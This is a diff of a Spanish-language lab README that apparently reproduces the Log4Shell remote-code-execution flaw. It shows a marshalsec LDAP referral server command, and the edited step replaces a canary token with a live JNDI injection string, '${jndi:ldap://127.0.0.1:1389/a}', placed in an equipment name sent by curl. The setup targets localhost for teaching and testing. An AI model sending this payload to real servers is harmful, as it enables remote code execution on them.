@@ -133,7 +133,7 @@ Esta vulnerabilidad permite ejecutar código en un servidor remoto, inyectando u
   java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8888/#Log4jRCE"
   ```
 
- 6- Generar una peticion HTTP Request para crear un `equipament` y en el nombre enviar el token malicioso creado con `canarytokens`
+ 6- Generar una peticion HTTP Request para crear un `equipament` y en el nombre enviar `${jndi:ldap://127.0.0.1:1389/a}`
 
   ```sh
   curl --request POST 'http://127.0.0.1:8080/api/equipaments' \
